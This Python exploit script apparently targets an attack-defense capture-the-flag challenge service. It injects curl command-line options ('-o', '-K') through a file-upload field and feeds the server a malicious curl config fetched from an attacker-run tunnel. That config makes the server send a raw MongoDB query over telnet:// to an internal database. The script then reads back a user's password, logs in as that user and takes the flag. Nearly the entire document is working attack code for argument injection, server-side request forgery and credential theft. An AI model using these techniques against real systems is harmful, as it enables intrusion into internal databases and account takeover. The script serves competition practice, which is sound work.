import sys
import utils
import tunnel
import threading
import time
import re

# Create a global variable and an event
tunnel_url = None
tunnel_url_event = threading.Event()


def exploit(ip, flag_id):
    # first we create the user with
    user = utils.UserChallenge(ip)
    user.register()

    # create a thread to handle the server
    def handle_server():
        global tunnel_url
        with tunnel.open_http_tunnel(tls=False) as t:
            tunnel_url = f"http://{t.remote_host}:{t.remote_port}"

            print(f"Tunnel URL: {tunnel_url}")
            tunnel_url_event.set()

            while True:
                _, path, _, _ = t.wait_request()

                data = b"???"
                if path == "/config":
                    data = b"""next
url="telnet://duogesto-database:27017"
upload-file="raw.txt"
output="leak.txt"
no-buffer
"""
                if path == "/raw.txt":
                    data = b"\x67\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xdd\x07\x00\x00\x00\x00\x00\x00\x00\x52\x00\x00\x00\x02\x66\x69\x6e\x64\x00\x06\x00\x00\x00\x75\x73\x65\x72\x73\x00\x03\x66\x69\x6c\x74\x65\x72\x00\x05\x00\x00\x00\x00\x03\x6c\x73\x69\x64\x00\x1e\x00\x00\x00\x05\x69\x64\x00\x10\x00\x00\x00\x04\x31\xdb\xaa\x5d\xd7\xab\x42\xde\xb9\xdb\x86\xf0\x88\x08\x17\xbc\x00\x02\x24\x64\x62\x00\x03\x00\x00\x00\x64\x62\x00\x00"

                t.send_response(200, {}, data)

    threading.Thread(target=handle_server).start()

    # wait for the tunnel url to be set
    tunnel_url_event.wait()
    print("tunnel url is: ", tunnel_url)

    user.upload_file(tunnel_url + "/config", "-o")
    user.upload_file(tunnel_url + "/raw.txt", "raw.txt")

    print("Exploiting...")
    try:
        user.upload_file("-K", "example.com")
    except:
        pass

    print("Downloading leaked data...")

    cid = user.create_challenge(
        {
            "text": 'aaa',
            "image": 'leak.txt',
            "answers": {
                1: {"answer": 'x', "correct": False},
                2: {"answer": 'x', "correct": False},
                3: {"answer": 'x', "correct": False},
            },
            "prize": 'x',
        }
    )
    res = user.get_qimage(cid)

    print(res)

    m = re.findall(re.escape(flag_id.encode()) + br"[^p]+password[^\w]+\x00([^\x00]+)\x00", res)
    print(m)

    assert m

    password_leaked = m[0].decode()

    print("Password leaked: ", password_leaked)

    bot_user = utils.UserChallenge(ip, flag_id, password_leaked)
    bot_user.login()

    challs = bot_user.get_challenges(flag_id)['challenges']

    print("Challenges: ", challs)

    cid = max(map(lambda c: c["_id"], challs))

    flag = bot_user.get_challenge(cid)['prize']

    print("Flag: ", flag)

    return flag


if __name__ == "__main__":

    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
